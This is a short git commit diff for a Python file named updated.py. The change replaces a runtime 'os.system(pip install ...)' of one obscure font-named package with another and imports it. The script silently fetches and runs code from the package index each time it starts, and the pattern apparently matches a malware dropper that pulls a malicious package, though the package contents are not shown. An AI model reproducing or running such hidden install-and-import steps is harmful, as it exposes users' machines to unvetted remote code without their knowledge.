0cb3f1b6c3d47798d8b98d57ab8cdfb893a0091c
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-05-01 15:56:43 -0700

    Update updated.py

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontslibv2")
-import pyfontslibv2
+os.system("pip install pyfontstyle")
+import pyfontstyle
 from optparse import Option
 import requests
 import threading
